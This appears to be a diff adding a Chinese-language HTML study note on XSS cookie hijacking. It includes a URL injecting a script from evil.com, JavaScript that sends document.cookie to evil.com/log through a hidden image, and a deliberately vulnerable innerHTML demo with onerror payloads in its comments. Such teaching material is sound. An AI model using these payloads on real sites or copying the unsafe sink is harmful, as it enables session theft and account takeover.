@@ -1,0 +1,39 @@
+<body>
+
+
+Cookie中一般加密保存了当前用户的登录凭证。Cookie如果丢失，往往意味着用户
+的登录凭证丢失。换句话说，攻击者可以不通过密码，而直接登录进用户的账户。
+攻击者先加载一个含有真正的XSS Payload远程脚本==（evil.js）==，避免直接在URL的参数里写入大量的
+JavaScript代码
+
+http://www.a.com/test.htm?abc="><script
+        src=http://www.evil.com/evil.js ></script>
+在evil.js中，可以通过如下代码窃取Cookie：
+
+var img = document.createElement("img");
+img.src = "http://www.evil.com/
+log?"+escape(document.cookie);
+document.body.appendChild(img);
+这段代码在页面中插入了一张看不见的图片，同时把document.cookie对象作为参数发送到远程服务器。事实上，http://www.evil.com/log并不一定要存在，因为这个请求会在远程服务器的Web日志中留下记录：
+
+原文链接：https://blog.csdn.net/weixin_43414889/article/details/105728136
+
+
+所以XSS攻击后，攻击者除了可以实施“Cookie劫持”外，还能够通过模拟GET、
+POST请求操作用户的浏览器。这在某些隔离环境中会非常有用，比如“Cookie劫持”失
+效时，或者目标用户的网络不能访问互联网等情况。
+
+
+<script>
+
+    // “Cookie劫持”攻击
+
+    function test(){
+        var str = document.getElementById('text').value;
+        document.getElementById("div").innerHTML = "<img src='"+str+"'/>"; // 攻击： '  onerror=alert(/我是xss/)  变成了 <img src="" ab="" onerror="alert(/我是xss/)" '=""> 也就是自动添加了=
+        // document.getElementById("div").innerHTML = "<img src="+str+" />"; // 攻击： abc onerror=alert(/我是xss/)
+        // onclick
+    }
+
+</script>
+</body>
